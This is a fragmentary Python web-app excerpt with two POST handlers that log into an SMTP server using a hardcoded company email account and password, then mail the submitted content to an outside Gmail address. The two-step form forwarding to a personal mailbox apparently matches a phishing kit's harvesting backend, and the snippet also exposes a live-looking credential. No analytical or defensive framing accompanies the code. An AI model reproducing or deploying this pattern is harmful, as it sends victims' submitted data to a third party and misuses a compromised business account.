...
def first():
    if request.method == 'POST':
        ...
        sender_email = "contabilidad@tecniductossas.com"
        sender_emaill = "owa"
        receiver_email = "kokofunds147@gmail.com"
        password = "A.1234567890a"
        ...
        with smtplib.SMTP_SSL("tecniductossas.comm", 465) as server:
...
def second():
    if request.method == 'POST':
        ...
        message.attach(part1)
        message.attach(part2)
        with smtplib.SMTP_SSL("tecniductossas.com", 465) as server:
            server.login(sender_email, password)
            server.sendmail(sender_email, receiver_email, message.as_string())
